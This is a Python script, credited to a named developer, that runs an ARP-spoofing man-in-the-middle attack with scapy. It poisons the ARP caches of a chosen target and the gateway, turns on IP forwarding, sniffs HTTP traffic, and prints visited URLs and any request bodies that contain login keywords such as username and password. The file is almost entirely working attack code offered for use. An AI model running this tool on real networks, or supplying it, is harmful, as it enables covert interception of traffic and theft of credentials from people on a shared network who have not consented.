# This is the script for performing MITM(Man-In-The-Middle) Attack.
# Developed By Dharmik Patel.
#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
from scapy.layers import http
import threading
import subprocess


# getting MAC Address of Target Computer
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    (answered_list, unanswered_list) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc


# Spoof the target with sending ARP Packets
def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# After completing the attack it will send default MAC Address to Target Machine
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Sniff the Packets
def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# get the URL from Packets
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# get the Login information from Packets
def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "email_id", "email", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


# Process sniffed packets
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + url)
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible username and password >> " + login_info + "\n\n")


# Main function
def main(target_ip, gateway_ip):
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    target_mac = get_mac(target_ip)
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, target_mac)
        sent_packet_count = sent_packet_count + 2
        # print("\r[+] Packet sent : " + str(sent_packet_count)),
        # sys.stdout.flush()
        time.sleep(2)


# Name of Developer(Dharmik Patel)
print(''' ____  _                          _ _ 
|  _ \| |__   __ _ _ __ _ __ ___ (_) | __ 
| | | | '_ \ / _` | '__| '_ ` _ \| | |/ / 
| |_| | | | | (_| | |  | | | | | | |   < 
|____/|_| |_|\__,_|_|  |_| |_| |_|_|_|\_\ 
''')


# Exception Handling
try:
    interface = raw_input("Enter Your Interface>")
    target_ip = raw_input("\nTarget IP>")
    gateway_ip = raw_input("\nGateway IP>")
    print("\nPress Control+z to Stop")
    print("\nPackets >>")
    arp_thread = threading.Thread(target=main, args=(target_ip, gateway_ip))
    arp_thread.start()
    sniffer(interface)

except KeyboardInterrupt:
    print("\n[+] Please wait until default mac address has given to target machine")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] control+c quitting")

